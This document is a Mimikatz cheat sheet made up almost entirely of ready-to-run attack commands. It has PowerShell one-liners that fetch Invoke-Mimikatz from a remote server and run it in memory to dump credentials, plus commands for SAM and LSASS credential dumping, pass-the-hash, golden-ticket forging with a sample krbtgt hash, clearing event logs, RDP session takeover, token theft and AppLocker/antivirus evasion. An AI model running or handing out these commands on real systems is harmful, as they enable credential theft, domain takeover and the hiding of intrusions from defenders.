# Mimikatz Cheat sheet

## <mark style="color:red;">Loading Mimikatz</mark>

Loading the Script in Memory with PS from localhost:

```powershell
IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.1/im.ps1') ; Invoke-Mimikatz -DumpCreds
```

Loading the Script in Memory with PS from GitHub repo:

```powershell
IEX (New-Object System.Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1’) ; Invoke-Mimikatz -DumpCreds
```

Loading the Script in Disk with PS:

```powershell
Invoke-WebRequest -UseBasicParsing http://192.168.52.200/Tools/Invoke-Mimikatz.ps1 -OutFile Invoke-Mimikatz.ps1 -Verbose
```

running remotely (on the same powershell session)

```powershell
Invoke-Mimikatz -Command '"sekurlsa::minidump lsass_612.dmp" "sekurlsa::logonPasswords"'
```

## <mark style="color:red;">Commands</mark>

### <mark style="color:orange;">bypass memory protections</mark>&#x20;

```
privilege::debug
token::elevate
```

### <mark style="color:orange;">List commands in module</mark>

Just type in the name of the module followed by :: and press enter

```
kerberos::
sekurlsa::
```

### <mark style="color:orange;">Base64 output of commands</mark>

```
base64 /out:true
base64 /out:false
```

### <mark style="color:orange;">dump the sam file</mark>

```
lsadump::sam
lsadump::sam /patch
```

### <mark style="color:orange;">Event</mark>

#### drop new event logs in system

```
event::drop
```

#### clear all event logs

```
event::clear  
```

### <mark style="color:orange;">sekurlsa</mark>

messing with LSA:

<pre><code># list  LM &#x26; NTLM credentials
mimikatz sekurlsa::msv
<strong>
</strong><strong># Lists WDigest credentials
</strong><strong>mimikatz sekurlsa::wdigest
</strong><strong>
</strong><strong># Lists Kerberos credentials
</strong>mimikatz sekurlsa::kerberos  &#x3C;I've seen this pull plain text passwords>

#  Lists TsPkg credentials
mimikatz sekurlsa::tspkg
mimikatz sekurlsa::livessp
mimikatz sekurlsa::ssp
mimikatz sekurlsa::logonPasswords
mimikatz sekurlsa::minidump
mimikatz sekurlsa::trust
mimikatz sekurlsa::backupkeys
mimikatz sekurlsa::tickets
mimikatz sekurlsa::ekeys
mimikatz sekurlsa::dpapi
mimikatz sekurlsa::credman</code></pre>

pass the hash

```
sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:[hash] /run:cmd
```

### <mark style="color:orange;">Tokens</mark>

#### show tokens

```
#list all
token::list

# important tokens
token::list /user:administrator
token::list /user:domainadmin
token::list /user:enterpriseadmin
token::list /user:system\
```

#### Run process with a token

```
token::run /process:cmd.exe
```

#### Get / revert those privileges

```
token::revert
token::elevate
```

### <mark style="color:orange;">kerberos</mark>

```
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi

kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
kerberos::tgt
kerberos::purge
```

### <mark style="color:orange;">services</mark>

```
process::stop /pid:1234
process::suspend /pid:1234
process::resume /pid:1234
```

### <mark style="color:orange;">RDP</mark>

<pre><code># allow multi-session rdp
ts::multirdp
 
# List all current sessions
ts::sessions

# Takeover specified session
ts::remote /id:1

<strong># Pass RDP session into other sessions ID
</strong>ts::remote /id:1 /target:2
<strong>
</strong><strong># Use password of user who owns sessions
</strong>ts::remote /id:1 /password:F@ll2019!</code></pre>

### <mark style="color:orange;">Applocker bypass</mark>

Misc in mimikatz may be able to launch apps blocked by applocker etc.

```
misc::cmd
misc::regedit

#  Some kind of filter that can tell if it's running sysmon, kaspersky etc
misc::mflt 

# This will inject into explorer.exe for sneakiness
misc::wp /file:tacos.jpg
```







